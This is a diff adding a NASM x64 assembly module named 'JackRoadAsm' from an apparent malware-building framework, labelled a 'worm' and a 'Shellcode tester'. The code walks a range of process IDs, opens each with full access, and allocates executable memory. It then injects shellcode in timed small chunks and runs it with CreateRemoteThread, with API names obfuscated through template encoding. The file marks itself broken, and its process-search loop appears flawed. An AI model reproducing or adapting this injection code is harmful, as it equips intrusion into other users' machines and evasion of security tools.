@@ -1,0 +1,480 @@
+#!name##JackRoadAsm
+#!types##worm
+#!info##Shellcode tester
+#!lang##asm
+#!system_FLAG##[W]
+#!globalVar##COMPILER##mingw-x64##The name of the compiler to build the executable file.
+#!globalVar##NO_DLL##True##Not include DLLs
+#!banned##module##starter##shadow##junk
+#!processWorm##WormLib
+#!reqSMod##DuckTales##SneakStore
+#!reqVar##JR_shoot##Pause in milliseconds between each partial shellcode injection.##int
+#!setVar##JR_shoot##100##int
+#!reqVar##JR_bytes_num##The size (in bytes) of each shellcode chunk to be injected.##int
+#!setVar##JR_bytes_num##16##int
+#!reqVar##JR_pause##Pause in milliseconds before starting the execution of the main function.##int
+#!setVar##JR_pause##1000##int
+#!broken_FLAG##True
+
+
+
+bits 64
+default rel
+
+extern ExitProcess
+extern printf
+extern DuckStartTales
+extern DuckShow
+extern DuckGetKFunc
+extern DuckGet
+extern DuckIntro
+extern SneakGetB
+extern SneakGetBs
+
+
+
+%define JACK_FUEL_LIMIT 1024    ; max shellcode length
+%define PROCESS_ALL_ACCESS 0x001FFFFF
+%define PAGE_EXECUTE_READWRITE 0x00000040
+%define VIRTUAL_MEM_FLAG 0x00001000 | 0x00002000    ; MEM_COMMIT | MEM_RESERVE
+%define JACK_ONE_SHOOT {{JR_bytes_num}}   ; how many bytes was be part-injected
+%define JACK_PAUSE_SHOOT {{JR_shoot}}    ; pause betwen inject in miliseconds
+%define JACK_START_PAUSE {{JR_pause}}   ; pause before start injection
+
+{% set DUCK_TBASE = TOOL.AsmSh_make_table(data=DT_text, set_as_default=True) %}
+
+
+section .data
+    jtext: db "%s", 10, 0
+    jtext_d: db "%s %d", 10, 0 
+    jtext_space: db 10, 10, 10, 0
+
+    jtext_err: dd {{TOOL.AsmSh_encode("---ERROR---")}} ; "---ERROR---"
+    jtext_op: dd {{TOOL.AsmSh_encode("Open process PID ")}}
+    jtext_am: dd {{TOOL.AsmSh_encode("Try alloc memory")}} ; "Try alloc memory"
+    jtext_twb: dd {{TOOL.AsmSh_encode("Try write test byte in process memory")}} ; "Try write test byte in process memory"
+    jtext_fvp: dd {{TOOL.AsmSh_encode("A vulnerable process was found")}} ; "A vulnerable process was found"
+    jtext_tvs: dd {{TOOL.AsmSh_encode("Try write shellcode to memory")}} ;"Try write shellcode to memory"
+    jtext_sw: dd {{TOOL.AsmSh_encode("Success write")}} ; "Success write"
+    jtext_allb: dd {{TOOL.AsmSh_encode("All bytes was injected")}} ; "All bytes was injected"
+    
+    
+    jack_test_byte: db "A", 0
+    jack_start: equ 2500    ; start PID
+    jack_end: equ 8000  ; last PID
+    
+    jackr_op_proc: dd {{TOOL.AsmSh_encode("OpenProcess")}} ; OpenProcess
+    jackr_vm_alloc: dd  {{TOOL.AsmSh_encode("VirtualAllocEx")}}; VirtualAllocEx
+    jackr_vp_mem: dd {{TOOL.AsmSh_encode("WriteProcessMemory")}} ; WriteProcessMemory
+    jackr_crt: dd {{TOOL.AsmSh_encode("CreateRemoteThread")}} ; CreateRemoteThread
+    jackr_slp: dd {{TOOL.AsmSh_encode("Sleep")}}; Sleep
+
+section .bss
+    jack_index: resq 1  ; actual PID
+    jack_fuel: resb JACK_FUEL_LIMIT ; shellcode buffer
+    jack_fuel_index: resd 1 ; shellcode buffer index
+    jack_target: resq 1     ; process handle
+    jack_home: resq 1   ; address of allocated memory
+    jack_op_proc: resq 1    ; OpenProcess address
+    jack_vm_alloc: resq 1   ; VirtualAllocEx
+    jack_vp_mem: resq 1 ; WriteProcessMemory
+    jack_crt: resq 1 ; CreateRemoteThread
+    
+    
+    buff: resb 1024
+
+section .text
+    global main
+
+
+main:
+
+    sub rsp, 40
+    ; ducktales init
+    call DuckStartTales
+    mov rcx, jackr_slp
+    mov rdx, 0
+    call DuckGet
+    mov rcx, JACK_START_PAUSE
+    call rax
+    call JackRoad   ; Init
+    call JackFind   ; find process
+    cmp rax, 0
+    je .exit
+    lea rcx, [jack_target]
+    mov rcx, [rcx]
+    mov rdx, JACK_ONE_SHOOT
+    call JackInject
+    call JackExec
+    
+    
+    .exit:
+        add rsp, 40
+        call exit
+
+JackExec:
+; exeute shellcode
+    push rbp
+    mov rbp, rsp
+    
+    ;create thread
+    sub rsp, 72
+    lea rcx, [jack_target]
+    mov rcx, [rcx]  ; hProcess
+    mov rdx, 0  ; lpThreadAttributes
+    mov r8, 0   ; dwStackSize
+    lea r9, [jack_home]
+    mov r9, [r9]    ; lpStartAddress
+    mov qword [rsp+32], 0
+    mov qword [rsp+40], 0
+    mov qword [rsp+48], 0
+    lea rax, [jack_crt]
+    mov rax, [rax]
+    call rax ; call CreateRemoteThread
+    add rsp, 72
+    
+    pop rbp
+    ret
+
+JackInject:
+; shellcode injection in parts
+; IN: rcx - process handle
+; IN: rdx - bytes 
+; OUT: rax - process handle
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    mov [rbp-8], rcx    ; proc handle
+    mov [rbp-16], rdx   ; bytes count
+    
+    
+    sub rsp, 40
+    .inject:
+        mov rcx, [rbp-8]
+        mov rdx, [rbp-16]
+        call JackPartInject
+        cmp rax, 0
+        je .return
+        mov rcx, jackr_slp
+        mov rdx, 0
+        call DuckGet
+        mov rcx, JACK_PAUSE_SHOOT
+        call rax
+        jmp .inject
+    
+    
+    
+    .return:
+        mov rax, [rbp-8]
+        add rsp, 16 + 40
+        pop rbp
+        ret
+
+JackPartInject:
+; Inject part of shellcode
+; IN: rcx - process handle
+; IN: rdx - num bytes
+; OUT: rax - 1 success or 0 shellcode end
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    mov [rbp-8], rcx    ; proc handle
+    mov [rbp-16], rdx   ; bytes count
+    
+    ; clear buffer
+    lea rdi, [jack_fuel]
+    mov rcx, JACK_FUEL_LIMIT
+    xor rax, rax
+    cld
+    rep stosb
+     
+    ;get part of shellcode
+    sub rsp, 40
+    lea rcx, [jack_fuel]
+    mov rdx, [rbp-16]
+    call SneakGetBs
+    add rsp, 40
+    
+    ;check shellcode end
+    lea rcx, [jack_fuel]
+    mov byte cl, [rcx]
+    cmp cl, 0
+    je .end
+    
+    sub rsp, 40
+    mov rcx, jtext_tvs
+    call DuckShow
+    mov rcx, jtext
+    mov rdx, rax
+    call printf
+    add rsp, 40
+    
+    ; Try write shellcode
+    
+    ; get memory index
+    lea rbx, [jack_fuel_index]
+    mov ebx, [rbx]
+   
+    
+    sub rsp, 56
+    mov rcx, [rbp-8]  ; hProcess
+    lea rdx, [jack_home]
+    mov rdx, [rdx]  ; lpBaseAddress
+    add rdx, rbx    ; base address + index
+    lea r8, [jack_fuel]    ; lpBuffer
+    mov r9, [rbp-16]   ; nSize
+    mov qword [rsp+32], 0   ; lpNumberOfBytesWritten
+    lea rax, [jack_vp_mem]
+    mov rax, [rax]
+    call rax    ; call WriteProcessMemory
+    add rsp, 56
+    cmp rax, 0
+    je .error
+    
+    sub rsp, 40
+    mov rcx, jtext_sw
+    call DuckShow
+    mov rcx, jtext
+    mov rdx, rax
+    call printf
+    add rsp, 40
+    
+    ; update index
+    lea rcx, [jack_fuel_index]
+    mov edx, [rcx]
+    add rdx, [rbp-16]
+    mov dword [rcx], edx
+    
+    mov rax, 1  ; success
+    
+    .return:
+        add rsp, 16
+        pop rbp
+        ret
+        
+    .return_zero:
+        xor rax, rax
+        jmp .return
+    
+    .error:
+        sub rsp, 40
+        mov rcx, jtext_err
+        call DuckShow
+        mov rcx, jtext
+        mov rdx, rax
+        call printf
+        add rsp, 40
+        jmp .return_zero
+
+    .end:
+        sub rsp, 40
+        mov rcx, jtext_allb
+        call DuckShow
+        mov rcx, jtext
+        mov rdx, rax
+        call printf
+        add rsp, 40
+        jmp .return_zero
+
+JackRoad:
+; Init function
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 40
+    mov rcx, jackr_op_proc
+    mov rdx, 0
+    call DuckGet
+    lea rcx, [jack_op_proc]
+    mov [rcx], rax
+    
+    mov rcx, jackr_vm_alloc
+    mov rdx, 0
+    call DuckGet
+    lea rcx, [jack_vm_alloc]
+    mov [rcx], rax
+    
+    mov rcx, jackr_vp_mem
+    mov rdx, 0
+    call DuckGet
+    lea rcx, [jack_vp_mem]
+    mov [rcx], rax
+    
+    mov rcx, jackr_crt
+    mov rdx, 0
+    call DuckGet
+    lea rcx, [jack_crt]
+    mov [rcx], rax
+    
+    add rsp, 40
+    pop rbp
+    ret
+
+JackFind:
+; Finds a shellcode-vulnerable process
+; OUT: rax - vul process PID or 0 (False)
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 40
+    
+    lea rcx, [jack_index]
+    mov qword [rcx], jack_start
+    
+    .find:
+        lea rcx, [jack_index]
+        mov rcx, [rcx]
+        mov rdx, jack_end
+        cmp rcx, rdx
+        je .false
+        call HitOne
+        cmp rax, 0
+        je .next
+        
+    
+   
+   
+    .return:
+        add rsp, 40
+        pop rbp
+        ret
+
+    .false:
+        xor rax, rax    ; return False
+        jmp .return
+        
+    .next:
+        lea rcx, [jack_index]
+        mov rdx, [rcx]
+        inc rdx ; index + 1
+        mov qword [rcx], rdx    ; save new index
+        jmp .find
+
+
+HitOne:
+; Checks if process is suitable for the victim
+; IN: rcx - PID number
+; OUT: rax - Process handle or 0
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    mov [rbp-8], rcx    ; PID
+    
+    ; reset data
+    lea rax, [jack_target]
+    mov qword [rax], 0
+    lea rax, [jack_home]
+    mov qword [rax], 0
+    
+    
+
+    sub rsp, 40
+    mov rcx, jtext_space
+    call printf
+    mov rcx, jtext_op
+    call DuckShow
+    mov rcx, jtext_d
+    mov rdx, rax
+    mov r8, [rbp-8]
+    call printf
+    add rsp, 40
+    
+    ;try open process
+    sub rsp, 40
+    mov rcx, PROCESS_ALL_ACCESS
+    xor rdx, rdx
+    mov r8, [rbp-8]
+    lea rax, [jack_op_proc]
+    mov rax, [rax]
+    call rax    ; call OpenProcess
+    add rsp, 40
+    cmp rax, 0
+    je .return_false
+    
+    lea rcx, [jack_target]
+    mov [rcx], rax  ; save process handle
+    
+    
+    sub rsp, 40
+    mov rcx, jtext_am
+    call DuckShow
+    mov rcx, jtext
+    mov rdx, rax
+    call printf
+    add rsp, 40
+    ;try alloc memory
+    
+    sub rsp, 56
+    lea rcx, [jack_target]
+    mov rcx, [rcx]  ; process handle
+    mov rdx, 0  ; lpAddress
+    mov r8, JACK_FUEL_LIMIT     ;dwSize
+    mov r9, VIRTUAL_MEM_FLAG    ; flAllocationType
+    mov qword [rsp+32], PAGE_EXECUTE_READWRITE    ; flProtect
+    lea rax, [jack_vm_alloc]
+    mov rax, [rax]
+    call rax    ; call VirtualAllocEx
+    add rsp, 56
+    cmp rax, 0
+    je .return_false
+    lea rcx, [jack_home]
+    mov [rcx], rax  ; save address
+    
+    sub rsp, 40
+    mov rcx, jtext_twb
+    call DuckShow
+    mov rcx, jtext
+    mov rdx, rax
+    call printf
+    add rsp, 40
+    
+    ; try write byte to memory
+    sub rsp, 56
+    lea rcx, [jack_target]
+    mov rcx, [rcx]  ; hProcess
+    lea rdx, [jack_home]
+    mov rdx, [rdx]  ; lpBaseAddress
+    lea r8, [jack_test_byte]    ; lpBuffer
+    mov r9, 1   ; nSize
+    mov qword [rsp+32], 0   ; lpNumberOfBytesWritten
+    lea rax, [jack_vp_mem]
+    mov rax, [rax]
+    call rax    ; call WriteProcessMemory
+    add rsp, 56
+    cmp rax, 0
+    je .return_false
+    
+    sub rsp, 40
+    mov rcx, jtext_fvp
+    call DuckShow
+    mov rcx, jtext
+    mov rdx, rax
+    call printf
+    add rsp, 40
+    
+    lea rax, [jack_target]
+    mov rax, [rax]  ; return process handle
+    
+    .return:
+        add rsp, 16
+        pop rbp
+        ret
+    
+    .return_false:
+        sub rsp, 40
+        mov rcx, jtext_err
+        call DuckShow
+        mov rcx, jtext
+        mov rdx, rax
+        call printf
+        add rsp, 40
+        xor rax, rax
+        jmp .return
+
+
+
+
+exit:
+    sub rsp, 40
+    mov rcx, 0
+    call ExitProcess
